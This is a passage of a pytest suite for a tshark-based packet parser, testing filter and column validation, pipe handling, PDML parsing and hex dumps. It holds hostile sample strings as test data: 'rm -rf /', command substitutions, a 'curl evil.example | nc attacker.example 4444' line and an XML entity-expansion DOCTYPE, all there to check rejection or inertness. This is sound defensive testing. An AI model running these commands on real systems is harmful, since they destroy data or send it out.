"""Tests for backend.packet_parser.

_validate_display_filter, ALLOWED_VIEW_FLAGS and _name_resolution_args are
pure and run anywhere, no tools required. Everything that actually shells
out to tshark/capinfos is marked pytest.mark.skipif and must show up as
SKIPPED in the report (pytest -r s), never silently vanish from the count --
a harness that prints "all passed" while quietly omitting the parser entirely
is exactly how a real regression (see CHANGELOG dev.7/dev.8, the -n/-nn
mixup) goes unnoticed for a release.
"""

from __future__ import annotations

import json
import shutil
import stat
import struct
import sys
from xml.etree import ElementTree

import pytest

from backend import packet_parser
from backend.pcapsource import PcapSource

HAS_TSHARK = shutil.which("tshark") is not None
HAS_CAPINFOS = shutil.which("capinfos") is not None

needs_tshark = pytest.mark.skipif(not HAS_TSHARK, reason="tshark is not installed in this environment")
needs_capinfos = pytest.mark.skipif(not HAS_CAPINFOS, reason="capinfos is not installed in this environment")


# --- _validate_display_filter: pure, no tools -------------------------------


@pytest.mark.parametrize(
    "benign",
    [
        "",
        "tcp",
        "tcp.port == 80",
        "ip.addr == 10.0.0.1",
        "http.request.method == \"GET\"",
        "frame.number == 42",
        "tcp.flags.syn == 1 and tcp.flags.ack == 0",
        # Wireshark's own operators. These were rejected as "forbidden
        # characters" until the rule was corrected, which meant the syntax most
        # people actually type could not be run.
        "tcp && ip",
        "http || dns",
        "!(arp or icmp)",
        "tcp.flags & 0x02",
    ],
)
def test_validate_display_filter_accepts_benign_filters(benign):
    packet_parser._validate_display_filter(benign)  # must not raise


@pytest.mark.parametrize("forbidden_char", list(";$`\\"))
def test_validate_display_filter_rejects_each_forbidden_character(forbidden_char):
    with pytest.raises(packet_parser.DisplayFilterError):
        packet_parser._validate_display_filter(f"tcp.port == 80{forbidden_char}whoami")


@pytest.mark.parametrize(
    "hostile",
    [
        "tcp.port == 80; rm -rf /",
        "tcp.port == 80`whoami`",
        "tcp.port == 80$(whoami)",
        "tcp.port == 80\\x00",
    ],
)
def test_validate_display_filter_rejects_hostile_filters(hostile):
    with pytest.raises(packet_parser.DisplayFilterError):
        packet_parser._validate_display_filter(hostile)


def test_validate_display_filter_rejects_an_overlong_filter():
    with pytest.raises(packet_parser.DisplayFilterError):
        packet_parser._validate_display_filter("a" * (packet_parser._FILTER_MAX_LEN + 1))


# `&` and `|` are allowed now, and the reason has to be a property of the code
# rather than an assurance: the filter reaches tshark through
# create_subprocess_exec as one argv element, with no shell anywhere on the
# path, so shell operators in it are text that tshark will reject as bad filter
# syntax -- not commands. This asserts exactly that, without needing tshark.


async def test_a_display_filter_reaches_the_tool_as_one_argument_and_no_shell():
    hostile = "tcp.port == 80 && curl evil.example | nc attacker.example 4444"
    probe = "import sys, json; print(json.dumps(sys.argv[1:]))"
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", probe, "-Y", hostile], BytesSource(b"")
    )
    assert rc == 0
    assert json.loads(stdout) == ["-Y", hostile]


def test_filter_rejection_keeps_tsharks_message_and_drops_the_banner():
    stderr = (
        b'Running as user "root" and group "root". This could be dangerous.\n'
        b"tshark: Constant expression is invalid.\n"
        b"    tcp.porrt == 80\n"
        b"    ^~~~~~~~~~~~~~~\n"
    )
    message = packet_parser._filter_rejection(stderr)
    assert message.startswith("Constant expression is invalid.")
    assert "Running as user" not in message
    # The caret line is the part that says where the mistake is.
    assert "^~~" in message


# --- ALLOWED_VIEW_FLAGS: pure, no tools --------------------------------------


def test_allowed_view_flags_contains_exactly_the_documented_set():
    assert packet_parser.ALLOWED_VIEW_FLAGS == {"-e", "-t", "-tt", "-ttt", "-tttt", "-tz"}


def test_local_time_asks_for_epoch_seconds_not_a_formatted_time():
    """-tz renders in the reader's zone, which only the browser knows. tshark's
    frame.time is the capture host's local time -- UTC in this container -- so
    the server sends epoch seconds and the frontend formats them."""
    assert packet_parser.VIEW_FLAG_TIME_FIELD["-tz"] == "frame.time_epoch"
    assert packet_parser.VIEW_FLAG_TIME_FIELD["-tttt"] == "frame.time"


def test_allowed_view_flags_matches_the_time_field_mapping_keys():
    # every VIEW_FLAG_TIME_FIELD key must be an allowed flag, or a flag could
    # change behavior silently without being documented as allowed
    assert set(packet_parser.VIEW_FLAG_TIME_FIELD) <= packet_parser.ALLOWED_VIEW_FLAGS


# --- _name_resolution_args: pure, no tools ------------------------------------


def test_name_resolution_args_off_by_default():
    assert packet_parser._name_resolution_args(False) == ["-n"]


def test_name_resolution_args_on_enables_host_lookup_explicitly():
    args = packet_parser._name_resolution_args(True)
    assert args == [
        "-N", "mnt",
        "-o", "nameres.network_name:TRUE",
        "-o", "nameres.use_external_name_resolver:TRUE",
    ]


def test_name_resolution_args_returns_a_copy_not_the_module_constant():
    """Mutating the returned list must never corrupt the shared constant for
    the next call -- that would make one caller's cleanup affect every
    future capture view."""
    args = packet_parser._name_resolution_args(False)
    args.append("--corrupted")
    assert packet_parser._name_resolution_args(False) == ["-n"]


# --- get_packet_list: filter validation happens before any tool runs -------


class BoomSource(PcapSource):
    """Proves the display filter is rejected before any subprocess is
    spawned -- feeding this source would raise if _run_tool ever reached it."""

    async def chunks(self):
        raise AssertionError("tshark should never be invoked for an invalid filter")
        yield b""  # pragma: no cover

    async def size(self) -> int:
        return 0


async def test_get_packet_list_rejects_hostile_filter_before_running_any_tool():
    with pytest.raises(ValueError):
        await packet_parser.get_packet_list(
            BoomSource(), display_filter="tcp.port == 80; rm -rf /"
        )


# --- integration tests: require a real tshark/capinfos ----------------------


def _build_minimal_pcap(num_packets: int = 1) -> bytes:
    """A hand-built libpcap file: one UDP packet (10.0.0.1:12345 -> 10.0.0.2:53,
    payload b"ping"), repeated. No scapy or fixture file needed -- just enough
    bytes for tshark to parse a real capture end to end."""
    global_header = struct.pack(
        "<IHHiIII",
        0xA1B2C3D4,  # magic (little-endian, microsecond precision)
        2, 4,        # version major, minor
        0, 0,        # thiszone, sigfigs
        65535,       # snaplen
        1,           # network = LINKTYPE_ETHERNET
    )

    eth = b"\xff\xff\xff\xff\xff\xff" + b"\x02\x00\x00\x00\x00\x01" + b"\x08\x00"
    payload = b"ping"
    udp_len = 8 + len(payload)
    udp = struct.pack(">HHHH", 12345, 53, udp_len, 0) + payload
    ip_total_len = 20 + udp_len
    ip = struct.pack(
        ">BBHHHBBH4s4s",
        0x45, 0, ip_total_len, 0, 0, 64, 17, 0,
        bytes([10, 0, 0, 1]), bytes([10, 0, 0, 2]),
    ) + udp
    frame = eth + ip

    records = b""
    for i in range(num_packets):
        records += struct.pack("<IIII", i, 0, len(frame), len(frame)) + frame
    return global_header + records


class BytesSource(PcapSource):
    def __init__(self, data: bytes) -> None:
        self._data = data

    async def chunks(self):
        yield self._data

    async def size(self) -> int:
        return len(self._data)


@needs_tshark
async def test_get_packet_list_parses_a_real_capture():
    packets = await packet_parser.get_packet_list(BytesSource(_build_minimal_pcap()))
    assert len(packets) == 1
    assert packets[0].number == 1
    assert packets[0].source == "10.0.0.1"
    assert packets[0].destination == "10.0.0.2"


@needs_tshark
async def test_get_packet_list_applies_display_filter():
    data = _build_minimal_pcap()
    matching = await packet_parser.get_packet_list(BytesSource(data), display_filter="udp.port == 53")
    assert len(matching) == 1
    none_matching = await packet_parser.get_packet_list(BytesSource(data), display_filter="udp.port == 9999")
    assert len(none_matching) == 0


@needs_tshark
async def test_get_packet_list_respects_offset_and_limit():
    data = _build_minimal_pcap(num_packets=5)
    packets = await packet_parser.get_packet_list(BytesSource(data), offset=2, limit=2)
    assert [p.number for p in packets] == [3, 4]


@needs_tshark
async def test_a_filter_tshark_rejects_is_reported_not_silently_empty():
    """A mistyped field used to produce an empty list reading "No packets
    match", which is exactly what a valid filter selecting nothing looks like.
    tshark exits non-zero on a filter it cannot parse and zero when one simply
    matches nothing, so the two are distinguishable and must be told apart."""
    with pytest.raises(packet_parser.DisplayFilterError) as exc:
        await packet_parser.get_packet_list(
            BytesSource(_build_minimal_pcap()), display_filter="tcp.porrt == 80"
        )
    assert "tcp.porrt" in str(exc.value)


@needs_tshark
async def test_a_valid_filter_matching_nothing_is_an_empty_list_not_an_error():
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), display_filter="tcp.port == 9999"
    )
    assert packets == []


# --- the operator's own columns ---------------------------------------------
#
# An added column is one more `-e` on the same pass. The pure checks below are
# the argv boundary and run anywhere; the tshark ones prove the values come
# back against the right fields.


@pytest.mark.parametrize("field", ["-r", "-e", "--version", "tcp.port;id", "$(id)", "a b", "", ".x"])
def test_a_field_that_could_be_read_as_a_flag_is_refused(field):
    """`-e -r` would hand tshark the flag that chooses which file to read. The
    pattern is what stops an added column from becoming an argument."""
    with pytest.raises(ValueError):
        packet_parser.validate_column_fields([field])


@pytest.mark.parametrize(
    "field",
    ["ip.src", "tcp.srcport", "_ws.col.Info", "ieee80211.fc.type-subtype", "tcp"],
)
def test_the_shapes_tshark_actually_uses_are_accepted(field):
    assert packet_parser.validate_column_fields([field]) == [field]


def test_the_same_field_twice_is_one_column():
    """Two identical -e arguments would print the value twice and shift every
    position after them, which is how a column ends up reading another's data."""
    assert packet_parser.validate_column_fields(
        ["ip.src", "ip.ttl", "ip.src"]
    ) == ["ip.src", "ip.ttl"]


def test_more_added_columns_than_the_cap_are_refused():
    with pytest.raises(ValueError):
        packet_parser.validate_column_fields(
            [f"ip.x{n}" for n in range(packet_parser.MAX_EXTRA_COLUMNS + 1)]
        )


@needs_tshark
async def test_an_added_column_comes_back_against_its_own_field():
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()),
        extra_fields=["udp.dstport", "ip.ttl"],
    )
    assert len(packets) == 1
    # The capture _build_minimal_pcap writes: 10.0.0.1:12345 -> 10.0.0.2:53.
    assert packets[0].values["udp.dstport"] == "53"
    assert packets[0].values["ip.ttl"].isdigit()
    # The built-in columns are unmoved by the added ones, which is the whole
    # point of appending them rather than mixing them in.
    assert packets[0].source == "10.0.0.1"
    assert packets[0].destination == "10.0.0.2"
    assert packets[0].info


@needs_tshark
async def test_added_columns_do_not_disturb_the_mac_columns():
    """The MAC fields are read from fixed positions and the added ones follow
    them, so a layout with both must not cross the two over."""
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()),
        view_flags=["-e"],
        extra_fields=["udp.dstport"],
    )
    assert packets[0].values["udp.dstport"] == "53"
    assert packets[0].src_mac and ":" in packets[0].src_mac
    assert packets[0].dst_mac and ":" in packets[0].dst_mac


@needs_tshark
async def test_no_added_columns_means_no_values_at_all():
    packets = await packet_parser.get_packet_list(BytesSource(_build_minimal_pcap()))
    assert packets[0].values == {}


@needs_tshark
async def test_a_column_tshark_cannot_dissect_is_reported_not_silently_empty():
    """The same rule the display filter has had since dev.8. tshark refuses the
    whole run over one unrecognised `-e`, and without this the packet list came
    back empty -- indistinguishable from a capture where nothing matched, about
    a column the reader cannot see."""
    with pytest.raises(packet_parser.ColumnFieldError) as exc:
        await packet_parser.get_packet_list(
            BytesSource(_build_minimal_pcap()),
            extra_fields=["definitely.not.a.real.field"],
        )
    assert "definitely.not.a.real.field" in str(exc.value)


@needs_tshark
async def test_a_bad_column_is_not_reported_as_a_bad_filter():
    """With both present, the field is the one at fault and has to be the one
    named: tshark fails the run before the filter is ever applied."""
    with pytest.raises(packet_parser.ColumnFieldError):
        await packet_parser.get_packet_list(
            BytesSource(_build_minimal_pcap()),
            display_filter="udp.port == 53",
            extra_fields=["definitely.not.a.real.field"],
        )


@needs_tshark
async def test_tshark_is_asked_which_field_names_are_real():
    unknown = await packet_parser.unknown_packet_fields(
        ["tcp.srcport", "ip.ttl", "definitely.not.a.real.field"]
    )
    assert unknown == ["definitely.not.a.real.field"]


@needs_tshark
async def test_a_protocol_name_counts_as_a_field():
    """`-e tcp` is what Wireshark's own protocol columns are built from, so a
    layout naming one is not a typo to refuse."""
    assert await packet_parser.unknown_packet_fields(["tcp"]) == []


@needs_tshark
async def test_wireshark_operators_run_rather_than_being_refused():
    """`&&` and `||` are what people type. They were rejected outright before."""
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap(num_packets=2)), display_filter="udp && ip"
    )
    assert len(packets) == 2


@needs_tshark
async def test_get_packet_detail_returns_layers_and_hex_dump():
    detail = await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), frame_number=1)
    assert detail.number == 1
    layer_names = {layer["name"] for layer in detail.layers}
    assert "ip" in layer_names
    assert "udp" in layer_names
    assert detail.hex_dump  # non-empty hex dump text


@needs_tshark
async def test_get_packet_detail_raises_for_missing_frame():
    with pytest.raises(ValueError):
        await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), frame_number=999)


@needs_capinfos
async def test_get_packet_count_matches_real_capture():
    count = await packet_parser.get_packet_count(BytesSource(_build_minimal_pcap(num_packets=3)))
    assert count == 3


# --- the tool exiting before the feed finishes -----------------------------
#
# A tool that has what it needs closes its stdin and exits while chunks are
# still being written, and the write that lands after that must not be treated
# as a failure to supply the capture.


class ClosedTransportSource(PcapSource):
    """Writes once, then fails the way a closed stdin fails."""

    def __init__(self, data: bytes, error: Exception) -> None:
        self._data = data
        self._error = error

    async def chunks(self):
        yield self._data
        raise self._error

    async def size(self) -> int:
        return len(self._data)


@needs_capinfos
@pytest.mark.parametrize(
    "error",
    [BrokenPipeError(), ConnectionResetError()],
    ids=["broken-pipe", "connection-reset"],
)
async def test_get_packet_count_survives_the_tool_closing_stdin_early(error):
    count = await packet_parser.get_packet_count(
        ClosedTransportSource(_build_minimal_pcap(num_packets=3), error)
    )
    assert count == 3


# --- how the capture reaches the tool ---------------------------------------
#
# Wiretap, the library under both tshark and capinfos, accepts a regular file
# or a FIFO on stdin and rejects everything else outright:
#
#   tshark: The standard input is a "special file" or socket or other
#   non-regular file.
#
# asyncio's stdin=PIPE is a real pipe, so it passes. uvloop's is a Unix
# socketpair, so it does not -- and uvicorn[standard] selects uvloop in the
# container. Every tshark call there returned no packets and every capinfos
# call no count, for a whole release, while this suite passed on stock asyncio.
# So the assertion is about the shape of the descriptor, not about the loop:
# it holds under both, and no tool needs to be installed to check it.


async def test_run_tool_hands_the_tool_a_fifo_on_stdin_not_a_socket():
    probe = (
        "import os, stat; "
        "print('fifo' if stat.S_ISFIFO(os.fstat(0).st_mode) else 'other')"
    )
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", probe], BytesSource(b"ignored")
    )
    assert rc == 0
    assert stdout.decode().strip() == "fifo"


async def test_run_tool_closes_the_write_end_so_the_tool_sees_eof():
    """A tool that reads to EOF must terminate. Leaving the parent's copy of the
    write end open leaves it blocked on a pipe nobody will ever close again."""
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", "import sys; sys.stdout.write(sys.stdin.read())"],
        BytesSource(b"three chunks worth"),
    )
    assert rc == 0
    assert stdout == b"three chunks worth"


@needs_capinfos
async def test_get_packet_count_raises_rather_than_reporting_zero_for_a_failed_tool():
    """0 meant both "an empty capture" and "capinfos never ran", which is what
    let the socketpair failure look like a legitimately empty capture."""
    with pytest.raises(RuntimeError, match="no packet count"):
        await packet_parser.get_packet_count(BytesSource(b"not a capture file"))


class UnreadableSource(PcapSource):
    """A source that genuinely cannot be read -- not a closed pipe."""

    async def chunks(self):
        raise OSError("captures volume is not readable")
        yield b""  # pragma: no cover

    async def size(self) -> int:
        return 0


@needs_capinfos
async def test_get_packet_count_still_fails_when_the_source_itself_breaks():
    """The pipe-closed exemption must not swallow a real read failure: output
    from a tool that was fed nothing is not a trustworthy packet count."""
    with pytest.raises(RuntimeError, match="could not supply capture data"):
        await packet_parser.get_packet_count(UnreadableSource())


# --- MAC columns on a cooked capture ------------------------------------------
#
# "tcpdump -i any" produces LINKTYPE_LINUX_SLL, which has no Ethernet header at
# all: eth.src and eth.dst are both empty on every frame. Since "any" is the
# default interface, -e showed two blank columns for most captures and read as
# a flag that did nothing.


def _build_cooked_pcap(num_packets: int = 1) -> bytes:
    """A libpcap file with LINKTYPE_LINUX_SLL (113), as `-i any` writes."""
    global_header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 113)
    sll = (
        struct.pack(">HHH", 0, 1, 6)
        + b"\x02\x00\x00\x00\x00\x01"
        + b"\x00\x00"
        + struct.pack(">H", 0x0800)
    )
    payload = b"ping"
    udp = struct.pack(">HHHH", 12345, 53, 8 + len(payload), 0) + payload
    ip = struct.pack(
        ">BBHHHBBH4s4s",
        0x45, 0, 20 + 8 + len(payload), 0, 0, 64, 17, 0,
        bytes([10, 0, 0, 1]), bytes([10, 0, 0, 2]),
    ) + udp
    frame = sll + ip
    records = b"".join(
        struct.pack("<IIII", i, 0, len(frame), len(frame)) + frame
        for i in range(num_packets)
    )
    return global_header + records


def test_mac_takes_the_first_column_that_has_an_address():
    assert packet_parser._mac(["", "", "aa:bb"], 1, 2) == "aa:bb"
    assert packet_parser._mac(["", "cc:dd", "aa:bb"], 1, 2) == "cc:dd"
    assert packet_parser._mac(["", "", ""], 1, 2) == ""
    assert packet_parser._mac(["only"], 1, 2) == ""


@needs_tshark
async def test_mac_columns_are_populated_on_an_ethernet_capture():
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), view_flags=["-e"]
    )
    assert packets[0].src_mac == "02:00:00:00:00:01"
    assert packets[0].dst_mac == "ff:ff:ff:ff:ff:ff"


@needs_tshark
async def test_the_source_mac_still_appears_on_an_any_interface_capture():
    """The whole point: this is what the default interface produces."""
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_cooked_pcap()), view_flags=["-e"]
    )
    assert packets[0].src_mac == "02:00:00:00:00:01"
    # A cooked header carries no destination address, so this one is honestly
    # empty rather than missing through a bug.
    assert packets[0].dst_mac == ""


@needs_tshark
async def test_mac_columns_stay_empty_when_the_flag_is_off():
    packets = await packet_parser.get_packet_list(BytesSource(_build_cooked_pcap()))
    assert packets[0].src_mac == ""
    assert packets[0].dst_mac == ""


# --- PDML parsing: pure, no tools ---------------------------------------------
#
# get_packet_detail moved from `-T json` to `-T pdml` so a field carries its own
# byte offset and length. Those two numbers are what lets a field highlight its
# bytes and a byte find its field; nothing else in the JSON output supplies
# them, so these tests pin the shape of what is parsed out.

_PDML_SAMPLE = b"""<?xml version="1.0"?>
<pdml version="0" creator="wireshark/4.2.2">
<packet>
  <proto name="geninfo" pos="0" showname="General information" size="58">
    <field name="num" pos="0" show="1" size="58"/>
  </proto>
  <proto name="frame" showname="Frame 1: 58 bytes" size="58" pos="0">
    <field name="frame.time_relative" showname="Time since reference: 0.000000000" size="0" pos="0" show="0.000000000"/>
  </proto>
  <proto name="tcp" showname="Transmission Control Protocol, Src Port: 51234" size="24" pos="34">
    <field name="tcp.srcport" showname="Source Port: 51234" size="2" pos="34" show="51234" value="c822"/>
    <field name="tcp.port" showname="Source or Destination Port: 51234" hide="yes" size="2" pos="34" show="51234" value="c822"/>
    <field name="tcp.flags" showname="Flags: 0x002 (SYN)" size="2" pos="46" show="0x0002" value="2">
      <field name="tcp.flags.syn" showname=".... .... ..1. = Syn: Set" size="1" pos="47" show="True" value="1"/>
    </field>
  </proto>
</packet>
</pdml>
"""


def test_parse_pdml_drops_geninfo():
    """PDML's own synthetic summary is not a protocol in the frame."""
    layers = packet_parser._parse_pdml(_PDML_SAMPLE)
    assert [layer["name"] for layer in layers] == ["frame", "tcp"]


def test_parse_pdml_keeps_wiresharks_own_labels():
    layers = packet_parser._parse_pdml(_PDML_SAMPLE)
    tcp = layers[1]
    assert tcp["label"] == "Transmission Control Protocol, Src Port: 51234"
    assert tcp["fields"][0]["label"] == "Source Port: 51234"


def test_parse_pdml_carries_byte_offsets():
    """The entire reason for PDML over -T json."""
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    srcport = tcp["fields"][0]
    assert srcport["pos"] == 34
    assert srcport["size"] == 2


def test_parse_pdml_field_name_and_value_make_a_filter():
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    srcport = tcp["fields"][0]
    assert srcport["name"] == "tcp.srcport"
    # `show`, not `value`: the filter is written against 51234, not 0xc822.
    assert srcport["value"] == "51234"


def test_parse_pdml_marks_generated_duplicates_hidden():
    """tcp.port sits beside tcp.srcport with hide="yes"; Wireshark draws neither."""
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    assert tcp["fields"][0]["hidden"] is False
    assert tcp["fields"][1]["name"] == "tcp.port"
    assert tcp["fields"][1]["hidden"] is True


def test_parse_pdml_nests_the_flag_bits():
    """The bit display: tshark writes the diagram, so it never has to be built."""
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    flags = tcp["fields"][2]
    assert flags["name"] == "tcp.flags"
    syn = flags["children"][0]
    assert syn["name"] == "tcp.flags.syn"
    assert syn["label"] == ".... .... ..1. = Syn: Set"
    assert syn["pos"] == 47


def test_parse_pdml_returns_none_when_no_packet_matched():
    empty = b'<?xml version="1.0"?><pdml version="0" creator="w"></pdml>'
    assert packet_parser._parse_pdml(empty) is None


def test_parse_pdml_refuses_a_document_type_declaration():
    """A billion-laughs expansion is the one way packet bytes could attack expat."""
    hostile = b'<?xml version="1.0"?><!DOCTYPE p [<!ENTITY a "x">]><pdml><packet/></pdml>'
    with pytest.raises(ValueError, match="document type declaration"):
        packet_parser._parse_pdml(hostile)


def test_parse_pdml_rejects_malformed_xml():
    with pytest.raises(ValueError, match="could not parse"):
        packet_parser._parse_pdml(b"<pdml><packet>")


def test_int_attr_survives_a_missing_or_unparseable_value():
    element = ElementTree.fromstring('<field pos="oops"/>')
    assert packet_parser._int_attr(element, "pos") == -1
    assert packet_parser._int_attr(element, "size") == 0


# --- the hex dump is built from the bytes, not scraped from tshark ------------


def test_hex_dump_text_lays_out_offset_hex_and_ascii():
    dump = packet_parser._hex_dump_text("48656c6c6f")
    assert dump == "0000  48 65 6c 6c 6f                                   Hello"


def test_hex_dump_text_wraps_at_sixteen_bytes():
    lines = packet_parser._hex_dump_text("00" * 20).splitlines()
    assert len(lines) == 2
    assert lines[0].startswith("0000  ")
    assert lines[1].startswith("0010  ")


def test_hex_dump_text_renders_unprintable_bytes_as_dots():
    assert packet_parser._hex_dump_text("00ff41").endswith("..A")


def test_hex_dump_text_of_nothing_is_nothing():
    assert packet_parser._hex_dump_text("") == ""


@needs_tshark
async def test_get_packet_detail_reports_offsets_and_frame_bytes():
    """End to end: the two things the viewer cannot render without."""
    detail = await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), 1)
    assert detail.frame_hex
    assert len(detail.frame_hex) % 2 == 0
    every_field = []

    def walk(fields):
        for field in fields:
            every_field.append(field)
            walk(field.get("children") or [])

    for layer in detail.layers:
        walk(layer["fields"])
    assert any(f["pos"] >= 0 and f["size"] > 0 for f in every_field)
    # Every offset a field claims has to exist in the bytes the viewer renders.
    frame_len = len(detail.frame_hex) // 2
    for field in every_field:
        if field["pos"] >= 0 and field["size"] > 0:
            assert field["pos"] + field["size"] <= frame_len


@needs_tshark
async def test_get_packet_detail_rejects_a_frame_that_is_not_there():
    with pytest.raises(ValueError, match="not found"):
        await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), 99)


# --- the rule click-to-filter is built on ------------------------------------
#
# The viewer turns a clicked field into `name == value`, and has to decide
# whether to quote the value. Addresses are literals in Wireshark's syntax and
# quoting one is a type error, not a string comparison -- the whole expression
# is rejected. That rule lives in the frontend (isBareLiteral in app.js), which
# the Python suite cannot execute, so what is pinned here is the tshark
# behaviour the rule exists to satisfy. If this ever stops being true, the
# frontend's quoting is wrong too.


@needs_tshark
async def test_an_address_literal_is_accepted_unquoted():
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), display_filter="ip.addr == 192.168.1.1"
    )
    assert isinstance(packets, list)


@needs_tshark
async def test_a_quoted_address_is_rejected():
    """The bug this pins: quoting every non-numeric value broke every address filter."""
    with pytest.raises(packet_parser.DisplayFilterError):
        await packet_parser.get_packet_list(
            BytesSource(_build_minimal_pcap()), display_filter='ip.addr == "192.168.1.1"'
        )


@needs_tshark
async def test_a_boolean_flag_filters_on_one():
    """PDML reports a flag as show="True"; the viewer writes == 1.

    tshark 4.2 happens to accept == True as well, so this is a canonical-form
    choice rather than a correctness fix: 1 and 0 are what Wireshark itself puts
    in the filter bar, and what older and newer tshark both take.
    """
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), display_filter="tcp.flags.syn == 1"
    )
    assert isinstance(packets, list)


def test_parse_pdml_refuses_a_lowercase_doctype_too():
    """XML only allows the uppercase form; not depending on that costs nothing."""
    hostile = b'<?xml version="1.0"?><!doctype p [<!entity a "x">]><pdml><packet/></pdml>'
    with pytest.raises(ValueError, match="document type declaration"):
        packet_parser._parse_pdml(hostile)


# --- which interface an "any" packet crossed ------------------------------------


def _cooked_v2_pcap(frames: list[tuple[int, int]]) -> bytes:
    """One UDP packet per (ifindex, pkttype), in a Linux cooked v2 capture."""
    ip = struct.pack(
        ">BBHHHBBH4s4s", 0x45, 0, 32, 0, 0, 64, 17, 0,
        bytes([10, 0, 0, 1]), bytes([10, 0, 0, 2]),
    ) + struct.pack(">HHHH", 12345, 9, 12, 0) + b"ping"
    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 276)
    records = b""
    for i, (ifindex, pkttype) in enumerate(frames):
        frame = struct.pack(">HHIHBB8s", 0x0800, 0, ifindex, 1, pkttype, 6,
                            bytes.fromhex("020000000001") + b"\0\0") + ip
        records += struct.pack("<IIII", i, 0, len(frame), len(frame)) + frame
    return header + records


@needs_tshark
async def test_any_capture_packets_carry_their_interface_name_and_direction():
    packets = await packet_parser.get_packet_list(
        BytesSource(_cooked_v2_pcap([(2, 0), (7, 4), (3, 1)])),
        interface_names={2: "eth0", 3: "wlan0"},
    )
    assert [(p.interface, p.ifindex, p.direction) for p in packets] == [
        ("eth0", 2, "in"), ("#7", 7, "out"), ("wlan0", 3, "broadcast"),
    ]
    # The two new fields sit before Info; the columns after them must not shift.
    assert packets[0].source == "10.0.0.1"
    assert packets[0].info


@needs_tshark
async def test_mac_columns_still_line_up_after_the_interface_fields():
    packets = await packet_parser.get_packet_list(
        BytesSource(_cooked_v2_pcap([(2, 0)])), view_flags=["-e"],
    )
    assert packets[0].src_mac == "02:00:00:00:00:01"
    assert packets[0].interface == "#2"


@needs_tshark
async def test_cooked_v1_has_a_direction_but_no_interface():
    packets = await packet_parser.get_packet_list(BytesSource(_build_cooked_pcap()))
    assert packets[0].interface == ""
    assert packets[0].ifindex == 0
    assert packets[0].direction == "in"


@needs_tshark
async def test_a_named_interface_capture_has_no_interface_fields():
    packets = await packet_parser.get_packet_list(BytesSource(_build_minimal_pcap()))
    assert (packets[0].interface, packets[0].ifindex, packets[0].direction) == ("", 0, "")


# --- protocol hierarchy, conversations/endpoints, follow stream --------------
#
# All three read the whole capture rather than one frame, so they get their
# own small multi-packet pcap: a three-way TCP handshake plus one HTTP
# request/response over it, and an unrelated UDP packet to a third host, so a
# hierarchy branch, a conversation direction split and an endpoint total all
# have something real to add up.

from tests.packet_builders import ethernet, ip4, ipv4, mac, pcap, read_pcap, tcp, udp  # noqa: E402


def _http_exchange_pcap() -> bytes:
    src_mac, dst_mac = mac("aa:bb:cc:dd:ee:01"), mac("aa:bb:cc:dd:ee:02")
    third_mac = mac("aa:bb:cc:dd:ee:03")
    a, b, c = ip4("10.0.0.1"), ip4("10.0.0.2"), ip4("10.0.0.3")
    req = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
    resp = b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello"

    def eth_ip(src, dst, smac, dmac, proto, payload):
        return ethernet(dmac, smac, 0x0800, ipv4(src, dst, proto, payload))

    frames = [
        eth_ip(a, b, src_mac, dst_mac, 6, tcp(a, b, 12345, 80, b"", flags=0x02, seq=0)),
        eth_ip(b, a, dst_mac, src_mac, 6, tcp(b, a, 80, 12345, b"", flags=0x12, seq=0)),
        eth_ip(a, b, src_mac, dst_mac, 6, tcp(a, b, 12345, 80, b"", flags=0x10, seq=1)),
        eth_ip(a, b, src_mac, dst_mac, 6, tcp(a, b, 12345, 80, req, flags=0x18, seq=1)),
        eth_ip(b, a, dst_mac, src_mac, 6, tcp(b, a, 80, 12345, b"", flags=0x10, seq=1)),
        eth_ip(b, a, dst_mac, src_mac, 6, tcp(b, a, 80, 12345, resp, flags=0x18, seq=1)),
        eth_ip(a, b, src_mac, dst_mac, 6, tcp(a, b, 12345, 80, b"", flags=0x10, seq=1 + len(req))),
        eth_ip(a, c, src_mac, third_mac, 17, udp(a, c, 5353, 53, b"dns-ish")),
    ]
    return pcap(frames)


@needs_tshark
async def test_protocol_hierarchy_nests_the_stack_and_totals_full_frame_bytes():
    tree = await packet_parser.get_protocol_hierarchy(BytesSource(_http_exchange_pcap()))
    assert [n.name for n in tree] == ["eth"]
    eth = tree[0]
    assert eth.frames == 8
    assert eth.bytes == sum(len(f) for f in read_pcap_frames(_http_exchange_pcap()))
    # frame.protocols carries "ethertype" as its own token between eth and ip
    # -- a real layer to tshark, not folded away, so the tree has to include
    # it rather than assume eth's only child is ip.
    ip = eth.children[0].children[0]
    assert ip.name == "ip" and ip.frames == 8
    by_name = {c.name: c for c in ip.children}
    assert by_name["tcp"].frames == 7
    assert by_name["udp"].frames == 1
    # http's own two frames (request and response) still carry the FULL frame
    # length, not just the http layer's share of it -- same as tshark's own
    # -z io,phs, verified separately against a real capture in this file's
    # earlier design pass.
    tcp_children = {c.name: c for c in by_name["tcp"].children}
    assert tcp_children["http"].frames == 2


def read_pcap_frames(data: bytes) -> list[bytes]:
    return [frame for _incl, _orig, frame in read_pcap(data)]


@needs_tshark
async def test_protocol_hierarchy_applies_a_display_filter():
